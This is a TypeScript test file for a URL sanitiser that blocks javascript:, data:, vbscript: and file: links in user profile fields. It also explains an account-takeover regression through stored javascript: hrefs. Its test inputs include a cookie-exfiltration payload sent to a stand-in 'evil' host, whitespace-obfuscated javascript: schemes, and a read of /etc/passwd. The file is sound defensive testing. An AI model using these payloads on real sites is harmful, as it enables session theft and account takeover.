import { describe, it, expect } from 'vitest'
import { safeExternalUrl, isSafeExternalUrl } from '@/lib/safe-url'

describe('safeExternalUrl', () => {
  /**
   * The regression this exists for. `achievements.credential_url` is typed by
   * one user, never validated on the way in (the `type="url"` input is not in a
   * `<form>`, so the browser never checks it, and the write goes straight to
   * Postgres from the client), and rendered as an `href` to *other* users by
   * `hub-profile-modal.tsx`. A `javascript:` value stored there was a working
   * link in every other member's session, in this origin, with the Supabase auth
   * cookie readable from script — account takeover on one click.
   */
  it('rejects javascript: URLs', () => {
    expect(safeExternalUrl('javascript:alert(1)')).toBeNull()
    expect(safeExternalUrl('javascript:fetch("//evil/"+document.cookie)')).toBeNull()
  })

  it('rejects a javascript: URL however it is dressed up', () => {
    // Case is not part of a scheme.
    expect(safeExternalUrl('JaVaScRiPt:alert(1)')).toBeNull()
    // Leading whitespace is stripped by the browser before parsing.
    expect(safeExternalUrl('  javascript:alert(1)  ')).toBeNull()
    // And the classic: the URL parser ignores tabs and newlines *inside* the
    // scheme, so all three of these are `javascript:` as far as the browser is
    // concerned. A naive `startsWith('javascript:')` check passes them through.
    expect(safeExternalUrl('java\tscript:alert(1)')).toBeNull()
    expect(safeExternalUrl('java\nscript:alert(1)')).toBeNull()
    expect(safeExternalUrl('jav\rascript:alert(1)')).toBeNull()
  })

  /**
   * An allowlist, so the schemes nobody remembered to deny are denied too.
   */
  it('rejects every scheme that is not http or https', () => {
    expect(safeExternalUrl('data:text/html,<script>alert(1)</script>')).toBeNull()
    expect(safeExternalUrl('vbscript:msgbox(1)')).toBeNull()
    expect(safeExternalUrl('file:///etc/passwd')).toBeNull()
    expect(safeExternalUrl('mailto:someone@example.com')).toBeNull()
    expect(safeExternalUrl('blob:https://example.com/uuid')).toBeNull()
  })

  it('rejects empty and non-string input', () => {
    expect(safeExternalUrl('')).toBeNull()
    expect(safeExternalUrl('   ')).toBeNull()
    expect(safeExternalUrl(null)).toBeNull()
    expect(safeExternalUrl(undefined)).toBeNull()
    // The DB column is nullable and untyped at the client, so a non-string
    // reaching here is a real possibility rather than a hypothetical.
    expect(safeExternalUrl(42 as unknown as string)).toBeNull()
  })

  it('rejects malformed URLs', () => {
    expect(safeExternalUrl('https://')).toBeNull()
    expect(safeExternalUrl('?query')).toBeNull()
    expect(safeExternalUrl('#fragment')).toBeNull()
  })

  it('passes through http and https URLs', () => {
    expect(safeExternalUrl('https://example.com/cert/123')).toBe('https://example.com/cert/123')
    expect(safeExternalUrl('http://example.com')).toBe('http://example.com/')
  })

  /**
   * The behaviour both replaced helpers had, and the reason they were safe by
   * accident: a value with no scheme is the bare host the user meant to type.
   * Preserved deliberately — people type `linkedin.com/in/name` into these
   * fields and expect it to work.
   */
  it('treats a value with no scheme as a bare host', () => {
    expect(safeExternalUrl('linkedin.com/in/someone')).toBe('https://linkedin.com/in/someone')
    expect(safeExternalUrl('example.com')).toBe('https://example.com/')
  })

  it('applies a bare-host prefix when even the host is implied', () => {
    // How `hub-profile-modal.tsx` renders a GitHub username on its own.
    expect(safeExternalUrl('someone', 'github.com/')).toBe('https://github.com/someone')
    // An already-complete URL ignores the prefix.
    expect(safeExternalUrl('https://github.com/someone', 'github.com/')).toBe(
      'https://github.com/someone'
    )
  })

  /**
   * The prefix must not become a way back in: prepending `https://` to something
   * that already carries a scheme would reshape `javascript:alert(1)` into a
   * URL that parses, which is precisely what the old helpers did.
   */
  it('never prefixes its way around a rejected scheme', () => {
    expect(safeExternalUrl('javascript:alert(1)', 'github.com/')).toBeNull()
    expect(safeExternalUrl('data:text/html,x', 'github.com/')).toBeNull()
  })

  it('returns the parsed form, not the raw input', () => {
    // What gets rendered is the string the URL parser vouched for.
    expect(safeExternalUrl('HTTPS://Example.COM/A')).toBe('https://example.com/A')
    expect(safeExternalUrl(' https://example.com/a ')).toBe('https://example.com/a')
  })
})

describe('isSafeExternalUrl', () => {
  it('agrees with safeExternalUrl', () => {
    for (const value of ['javascript:alert(1)', '', 'https://', 'data:text/html,x']) {
      expect(isSafeExternalUrl(value)).toBe(false)
    }
    for (const value of ['https://example.com', 'example.com/a']) {
      expect(isSafeExternalUrl(value)).toBe(true)
    }
  })
})
